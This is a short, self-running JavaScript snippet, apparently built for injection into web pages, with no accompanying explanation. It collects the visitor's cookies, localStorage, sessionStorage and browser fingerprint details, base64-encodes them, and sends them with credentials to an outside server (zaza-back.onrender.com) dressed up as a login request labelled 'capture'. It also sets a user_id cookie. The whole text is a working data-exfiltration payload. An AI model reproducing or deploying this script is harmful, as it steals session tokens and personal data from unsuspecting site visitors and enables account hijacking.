(function () {
  const uid = localStorage.getItem("session_id") || crypto.randomUUID();
  localStorage.setItem("session_id", uid);
  document.cookie = "user_id=99; path=/";

  const data = {
    cookies: document.cookie || "[no cookies]",
    localStorage: Object.fromEntries(Object.entries(localStorage || {})),
    sessionStorage: Object.fromEntries(Object.entries(sessionStorage || {})),
    userAgent: navigator.userAgent,
    location: location.href,
    screen: { width: screen.width, height: screen.height },
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    date: new Date().toISOString()
  };

  const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));

  fetch('https://zaza-back.onrender.com/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
      email: 'autobot@ping',
      password: 'capture',
      cookies: encoded
    })
  });
})();
